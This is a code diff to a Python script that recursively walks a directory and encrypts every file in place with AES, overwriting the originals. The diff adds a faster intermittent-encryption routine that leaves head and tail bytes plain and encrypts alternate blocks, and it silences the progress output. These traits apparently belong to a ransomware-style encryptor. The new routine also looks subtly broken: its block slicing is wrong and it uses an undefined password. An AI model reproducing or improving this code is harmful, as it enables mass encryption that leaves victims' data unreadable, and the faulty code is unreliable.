@@ -13,9 +13,17 @@ import sys
 import time
 import itertools
 import tqdm
+import gc
 
 from array import array
 
+def free_memory():
+    gc.collect(0)
+    gc.collect(1)
+    gc.collect(2)
+    gc.collect(0)
+    gc.collect(1)
+    gc.collect(2)
 
 from Cryptodome.Cipher import AES
 from hashlib import md5
@@ -54,11 +62,11 @@ def encrypt_full_file(filename):
             f.close()
         os.system(f"rm {filename}")
         os.system(f"mv {output_filename} {filename}")
-        print(f"Encrypted {filename}")
+        #print(f"Encrypted {filename}")
     return {filename: True}
 
 
-def encrypt_file_alternate_blocks(block_size):
+def encrypt_file_alternate_blocksv2_unopt(block_size):
     """
         Do not encrypt the first 128 bytes
         Do not encrypt the last 128 bytes
@@ -66,7 +74,7 @@ def encrypt_file_alternate_blocks(block_size):
         every alternate 16 bytes (or block size bytes)
     """
     def encrypt_fn(filename):
-        print(f"Encrypting {filename} : {EXTREMITY_SIZE} {BLOCK_SIZE}")
+        #print(f"Encrypting {filename} : {EXTREMITY_SIZE} {BLOCK_SIZE}")
         if not os.path.exists(filename) or not os.path.isfile(filename):
             return
 
@@ -126,8 +134,74 @@ def encrypt_file_alternate_blocks(block_size):
 
     return encrypt_fn
 
+def encrypt_file_alternate_blocksv2_opt(block_size):
+    def encrypt_fn(filename):
+        if not os.path.exists(filename) or not os.path.isfile(filename):
+            return
 
-PARALLEL_JOBS = 128
+        plainbuffer = readimage(filename)
+        tempbuffer = plainbuffer
+        # If the buffer is too small, increase it's size
+        while len(tempbuffer) < 1024 + 2 * EXTREMITY_SIZE:
+            tempbuffer += plainbuffer
+        plainbuffer = tempbuffer
+        tempbuffer = None
+        
+        while len(plainbuffer) % EXTREMITY_SIZE != 0:
+            plainbuffer += plainbuffer[-1:]
+
+        # Store the tail and head in different buffers
+        head_buffer = plainbuffer[:EXTREMITY_SIZE]
+        tail_buffer = plainbuffer[-EXTREMITY_SIZE:]
+
+        # Now chop off the tail and the head
+        plainbuffer = plainbuffer[EXTREMITY_SIZE:]
+        plainbuffer = plainbuffer[:-EXTREMITY_SIZE]
+
+        npbuffer = np.frombuffer(plainbuffer, np.uint8)
+        npbuffer = npbuffer.reshape(\
+            (npbuffer.shape[0] // block_size, block_size))
+
+        even_npbuffer = npbuffer[::block_size]
+        odd_npbuffer = npbuffer[1::block_size]
+
+        encrypted_buffer = encrypt_buffer(odd_npbuffer.tobytes(), "", password)
+        unencrypted_buffer = even_npbuffer.tobytes()
+
+
+        try:
+            output_filename = f"{filename}.out"
+            with open(output_filename, "wb") as f:
+                # First writ the head unencrypted bit
+                f.write(head_buffer)
+
+                enc_ind = 0
+                unenc_ind = 0
+
+                # Now alternatively write encrypted and unencrypted blocks
+                while enc_ind < len(encrypted_buffer) \
+                    or unenc_ind < len(unencrypted_buffer):
+
+                    if enc_ind < len(encrypted_buffer):
+                        f.write(encrypted_buffer[enc_ind:enc_ind + block_size])
+                        enc_ind += block_size
+
+                    if unenc_ind < len(unencrypted_buffer):
+                        f.write(unencrypted_buffer[\
+                                    unenc_ind:unenc_ind + block_size])
+                        unenc_ind += block_size
+
+                # Finally write the tail unencrypted buffer
+                f.write(tail_buffer)
+                f.close()
+            os.unlink(filename)
+            os.rename(output_filename, filename)
+        except Exception as e:
+            raise e
+
+    return encrypt_fn
+
+PARALLEL_JOBS = 8
 
 
 
@@ -145,13 +219,14 @@ def iterate_files(base_dir):
     savedir = None
 
     encryption_fn = encrypt_full_file
-    encryption_fn = encrypt_file_alternate_blocks(BLOCK_SIZE)
+    encryption_fn = encrypt_file_alternate_blocksv2_opt(BLOCK_SIZE)
     try:
         savedir = os.getcwd()
         os.chdir(base_dir)
         filenames = glob.glob("./**", recursive=True)
         for i in tqdm.tqdm(range(0, len(filenames), PARALLEL_JOBS)):
             list(map(encryption_fn, filenames[i: i + PARALLEL_JOBS]))
+            free_memory()
     except Exception as e:
         logging.error(f"Exception in iteration {e}")
         raise e
